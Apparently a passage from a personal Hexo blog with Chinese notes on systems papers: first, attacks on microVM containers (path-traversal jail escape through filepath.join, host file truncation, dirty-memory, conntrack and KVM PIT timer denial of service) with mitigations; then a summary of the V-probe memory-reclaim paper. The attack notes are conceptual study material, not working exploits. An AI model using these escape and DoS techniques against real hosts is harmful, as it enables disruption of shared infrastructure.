<p>并且代码使用的filepath.join会导致组合的路径逃出jail</p>
</li>
<li><p>chown可以任意修改文件权限</p>
<p>create可以任意清空文件，例如清空host的.so 让host crash</p>
</li>
</ol>
<p><strong>CreateVM 策略1</strong></p>
<p>“path&#x2F;filepath”  filepath.join 在某一个路径存在<code>/../../../</code>的情况下 最后组合的路径会把另一个前面的吃掉</p>
<p>换成”github.com&#x2F;containerd&#x2F;continuity&#x2F;fs” fs.RootPath</p>
<p>用户控制一个 可以逃出runc指定的jail路径</p>
<p><strong>CreateVM 策略1</strong></p>
<h2 id="6-firecracker-based-container-dirty-memory-attack"><a href="#6-firecracker-based-container-dirty-memory-attack" class="headerlink" title="6 firecracker-based container dirty memory attack"></a>6 firecracker-based container dirty memory attack</h2><p>类似kata container</p>
<p>但是firecracker使用的是virio-blk</p>
<p><strong>write 策略2</strong></p>
<h2 id="7-Firecracker-based-Container-Nf-conntrack-TableAttack"><a href="#7-Firecracker-based-Container-Nf-conntrack-TableAttack" class="headerlink" title="7 Firecracker-based Container Nf_conntrack TableAttack"></a>7 Firecracker-based Container Nf_conntrack TableAttack</h2><p>用virtio-net device 而不是kernel module</p>
<p>但是效果一样</p>
<p><strong>connect 策略2</strong></p>
<p>被AWS修复了  没找到怎么修复</p>
<h2 id="8-KVM-PIT-Timer-Attack"><a href="#8-KVM-PIT-Timer-Attack" class="headerlink" title="8 KVM PIT Timer Attack"></a>8 KVM PIT Timer Attack</h2><ol>
<li>guest疯狂写某写io port 触发PIT timer 且period很短</li>
<li>host调度kvm-pit线程 pit_do_work往guest插入中断</li>
<li>内核线程属于root cgroup 消耗资源不算在user space</li>
<li>cpu memory io的benchmark性能都下降</li>
</ol>
<p>个人认为这里是server的资源并不多 并且开的container太多 导致消耗大量资源的PIT thread在整体可用资源的占比变高</p>
<p><strong>outb 策略3</strong></p>
<p>qemu用HPET代替了PIT 具体实现不深入研究</p>
<p>也是一个VM一个 所以也可以放到cgroup中</p>
<p>或者直接禁用</p>
<h2 id="traditional-VM"><a href="#traditional-VM" class="headerlink" title="traditional VM"></a>traditional VM</h2><ul>
<li>dirty memory dos有效</li>
<li>nf_conntrack dos有效</li>
<li>vhost-net 有效</li>
<li>viriofs提权 有效 9pfs也有效</li>
<li>PIT 不用了 所以无效</li>
</ul>
<p>这些漏洞存在 但是普通VM不一定用 microVM定死了组件 所以一定用</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://szy0127.github.io/2024/01/23/papers/V-probe/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="szy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="S blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | S blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/01/23/papers/V-probe/" class="post-title-link" itemprop="url">V-probe</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2024-01-23 13:27:32 / Modified: 13:29:42" itemprop="dateCreated datePublished" datetime="2024-01-23T13:27:32+08:00">2024-01-23</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/papers/" itemprop="url" rel="index"><span itemprop="name">papers</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span>1.2k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>5 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="V-probe"><a href="#V-probe" class="headerlink" title="V-probe"></a>V-probe</h1><p>ATC23</p>
<h2 id="问题与目标"><a href="#问题与目标" class="headerlink" title="问题与目标"></a>问题与目标</h2><p>IO直通的DMA操作与memory overcommitment产生冲突</p>
<p>因为DMA操作需要保证内存是固定不变的  overcommitment需要动态调整</p>
<p>现有方案：</p>
<ul>
<li>IOPF：DMA会产生pagefault，依赖memory reclaim ，swap慢 balloon通信慢 hyperupcall可能回收了DMA缓冲区导致失败</li>
<li>vIOMMU coIOMMU 让hypervisor 知道VM的DMA信息 兼容性差</li>
</ul>
<p>希望</p>
<ul>
<li>保证DMA不会失败</li>
<li>不需要特殊硬件</li>
<li>不需要修改guest内核</li>
<li>性能好</li>
</ul>
<h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><p>类似hyperupcall 但是用编译好的二进制</p>
<p>guest启动后动态加载</p>
<p>限制只能用rdi rax 不允许访问内存 不允许大于64bytes  不能跳转</p>
<p>关于page：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zhoutaopower/article/details/87090982">Linux 内存管理窥探（5）：page 数据结构_爱洋葱的博客-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="http://linux.laoqinren.net/kernel/memory-page/">struct page结构体 - Notes about linux and my work (laoqinren.net)</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/573338379">linux内核那些事之struct page - 知乎 (zhihu.com)</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_MAPCOUNT_OPS(uname, lname)					\</span></span><br><span class="line"><span class="meta">static __always_inline int Page##uname(struct page *page)		\</span></span><br><span class="line"><span class="meta">&#123;									\</span></span><br><span class="line"><span class="meta">	return atomic_read(&amp;page-&gt;_mapcount) ==				\</span></span><br><span class="line"><span class="meta">				PAGE_##lname##_MAPCOUNT_VALUE;		\</span></span><br><span class="line"><span class="meta">&#125;									\</span></span><br><span class="line"><span class="meta">static __always_inline void __SetPage##uname(struct page *page)		\</span></span><br><span class="line"><span class="meta">&#123;									\</span></span><br><span class="line"><span class="meta">	VM_BUG_ON_PAGE(atomic_read(&amp;page-&gt;_mapcount) != -1, page);	\</span></span><br><span class="line"><span class="meta">	atomic_set(&amp;page-&gt;_mapcount, PAGE_##lname##_MAPCOUNT_VALUE);	\</span></span><br><span class="line"><span class="meta">&#125;									\</span></span><br><span class="line"><span class="meta">static __always_inline void __ClearPage##uname(struct page *page)	\</span></span><br><span class="line"><span class="meta">&#123;									\</span></span><br><span class="line"><span class="meta">	VM_BUG_ON_PAGE(!Page##uname(page), page);			\</span></span><br><span class="line"><span class="meta">	atomic_set(&amp;page-&gt;_mapcount, -1);				\</span></span><br><span class="line"><span class="meta">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * PageBuddy() indicate that the page is free and in the buddy system</span></span><br><span class="line"><span class="comment"> * (see mm/page_alloc.c).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_BUDDY_MAPCOUNT_VALUE		(-128)</span></span><br><span class="line">PAGE_MAPCOUNT_OPS(Buddy, BUDDY)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> page_private(page)		((page)-&gt;private)</span></span><br></pre></td></tr></table></figure>

<p>一个用于拿是否free 一个用于拿order</p>
<p>这些函数的参数都是page结构体的GVA，所以注册函数的同时需要把guest内核page存放的GPA也一同放入</p>
<p>由于代码在host上执行，不需要GVA-&gt;GPA 所以这段代码不论是GPA-&gt;HVA还是如何翻译 总能在hypervisor上解决</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"> procedure MEMORYRECLAMATION</span><br><span class="line"><span class="number">2</span>: <span class="keyword">for</span> each GFN in GUEST <span class="keyword">do</span></span><br><span class="line"><span class="number">3</span>: <span class="keyword">if</span> GFN is reclaimed then</span><br><span class="line"><span class="number">4</span>: <span class="keyword">continue</span></span><br><span class="line"><span class="number">5</span>: SP ← <span class="class"><span class="keyword">struct</span> <span class="title">page</span> <span class="title">of</span> <span class="title">GFN</span> <span class="title">in</span> <span class="title">GUEST</span></span></span><br><span class="line"><span class="class">6:</span> FREE ← GUEST.PAGE_FREE(SP)</span><br><span class="line"><span class="number">7</span>: ORD ← GUEST.PAGE_ORD(SP)</span><br><span class="line"><span class="number">8</span>: <span class="keyword">if</span> FREE and ORD ≥ MIN_ORD then</span><br><span class="line"><span class="number">9</span>: Lock MUTEX</span><br><span class="line"><span class="number">10</span>: Make the <span class="class"><span class="keyword">struct</span> <span class="title">page</span> <span class="title">GPA</span> <span class="title">range</span> <span class="title">read</span>-<span class="title">only</span></span></span><br><span class="line"><span class="class">11:</span> SP′ ← <span class="class"><span class="keyword">struct</span> <span class="title">page</span> <span class="title">of</span> <span class="title">GFN</span> <span class="title">in</span> <span class="title">GUEST</span></span></span><br><span class="line"><span class="class">12:</span> FREE′ ← GUEST.PAGE_FREE(SP′)</span><br><span class="line"><span class="number">13</span>: ORD′ ← GUEST.PAGE_ORD(SP′)</span><br><span class="line"><span class="number">14</span>: <span class="keyword">if</span> FREE′ and ORD′ ≥ MIN_ORD then</span><br><span class="line"><span class="number">15</span>: GFNst ← GFN</span><br><span class="line"><span class="number">16</span>: GFNen ← GFN + (<span class="number">1</span> &lt;&lt; ORD′)</span><br><span class="line"><span class="number">17</span>: RANGE ← [GFNst, GFNen)</span><br><span class="line"><span class="number">18</span>: Unmap EPT in RANGE</span><br><span class="line"><span class="number">19</span>: Unmap IOMMU in RANGE</span><br><span class="line"><span class="number">20</span>: Add RANGE to the reclaimed <span class="built_in">set</span></span><br><span class="line"><span class="number">21</span>: Release reclaimed pages to hypervisor</span><br><span class="line"><span class="number">22</span>: Unlock MUTEX</span><br><span class="line"><span class="number">23</span>: <span class="keyword">return</span> SUCCESS</span><br><span class="line"><span class="number">24</span>: Make the <span class="keyword">struct</span> page GPA range read-write</span><br><span class="line"><span class="number">25</span>: Unlock MUTEX</span><br><span class="line"><span class="number">26</span>: <span class="keyword">return</span> FAIL</span><br></pre></td></tr></table></figure>

<p>记录到reclaimed set中 并且解除映射</p>
<p>一旦解除映射 对应的物理内存就空出来了 满足overcommitment</p>
<p>回收代码定时触发或者事件触发</p>
<p>我认为第21行需要完成两件事</p>
<ul>
<li>这里光解除映射 实际上host还是不可用 需要用host kernel的对应函数和数据结构修改  但是已经运行在host上 并且知道guest的所有信息 并不难做到(类似qemu 可用madvise) 但是否有不一致问题？</li>
<li>修改guest struct page 标记不可用 否则guest当作free仍然分配并使用 可能导致触发大量page fault和VMexit</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> procedure PAGEFAULTHANDLER</span><br><span class="line"><span class="number">2</span>: Lock MUTEX</span><br><span class="line"><span class="number">3</span>: RANGE ← GetReclaimedRange(GUEST , GPA)</span><br><span class="line"><span class="number">4</span>: PAGES ← pages reallocated <span class="keyword">for</span> RANGE</span><br><span class="line"><span class="number">5</span>: Map RANGE to PAGES in EPT</span><br><span class="line"><span class="number">6</span>: Map RANGE to PAGES in IOMMU</span><br><span class="line"><span class="number">7</span>: Remove RANGE from the reclaimed <span class="built_in">set</span></span><br><span class="line"><span class="number">8</span>: Make the <span class="class"><span class="keyword">struct</span> <span class="title">page</span> <span class="title">GPA</span> <span class="title">range</span> <span class="title">read</span>-<span class="title">write</span></span></span><br><span class="line"><span class="class">9:</span> Unlock MUTEX</span><br><span class="line"><span class="number">10</span>: <span class="keyword">return</span></span><br><span class="line">Input: GUEST , GPA</span><br><span class="line">Output: RANGE</span><br><span class="line"><span class="number">11</span>: procedure GETRECLAIMEDRANGE</span><br><span class="line"><span class="number">12</span>: <span class="keyword">for</span> each RANGE in the reclaimed <span class="built_in">set</span> of GUEST <span class="keyword">do</span></span><br><span class="line"><span class="number">13</span>: SPst ← the start <span class="keyword">struct</span> page GPA in RANGE</span><br><span class="line"><span class="number">14</span>: SPen ← the end <span class="keyword">struct</span> page GPA in RANGE</span><br><span class="line"><span class="number">15</span>: <span class="keyword">if</span> SPst ≤ GPA ≤ SPen then</span><br><span class="line"><span class="number">16</span>: <span class="keyword">return</span> RANGE</span><br></pre></td></tr></table></figure>

<p>DMA发生page fault 需要重新拿回对应的物理内存</p>
<p>这时候从reclaimed set中寻找原来的地址判断长度 然后重新映射 保证了DMA用的HPA虽然在动态变化但是仍可用 </p>
<p>这里的两个函数应该都是加到hypervisor代码中去的(修改host内核)</p>
<p>普通的page fault和DMA的page fault都使用这个函数</p>
<p>所以具体实现上仍然需要支持IOPF的硬件  实验中作者是自己修改硬件来支持的</p>
<h2 id="并发"><a href="#并发" class="headerlink" title="并发"></a>并发</h2><h3 id="host与guest"><a href="#host与guest" class="headerlink" title="host与guest"></a>host与guest</h3><p>把host需要回收的page结构体都改为read only 随后再进行检查 这样做保证了满足要求的page都不会被guest修改</p>
<h3 id="reclaim与page-fault"><a href="#reclaim与page-fault" class="headerlink" title="reclaim与page fault"></a>reclaim与page fault</h3><p>用host自己的mutex lock</p>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>这篇文章相当于设备直通场景下的hypercall 因此测试除了常规回收内存之外 还增加了特定的IO测试</p>
<p>例如tcp udp和redis</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>不管guest怎么操作自己的数据结构 入口一定是在host的</p>
<p>必须保证host拥有guest数据结构的地址和布局 并且提供给这段代码才可以</p>
<p>代码其实是修改了host自己的reclaim和page fault逻辑自己执行 不需要VM enter和exit</p>
<p>这种方式和balloon完全不同 不需要guest自己任何参与 对guest来说 仍然认为自己有着全部内存 不知道二级页表映射已经失效了</p>
<ul>
<li>balloon：guest判断free guest标记不可用 host unmap</li>
<li>v-probe：host判断free (host标记guest不可用) host unmap</li>
</ul>
<p>v-probe就算不顺带解决IOPF的问题 从性能上单独来说也是碾压balloon的，因为通过在host访问guest数据结构绕开了virtio这个大框架</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" title="Next page" aria-label="Next page" href="/page/2/"><i class="fa fa-angle-right"></i></a>
  </nav>

</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">szy</span>
  </div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="Word count total">208k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">12:37</span>
  </span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

    </div>
  </footer>

  
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>







  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>





</body>
</html>
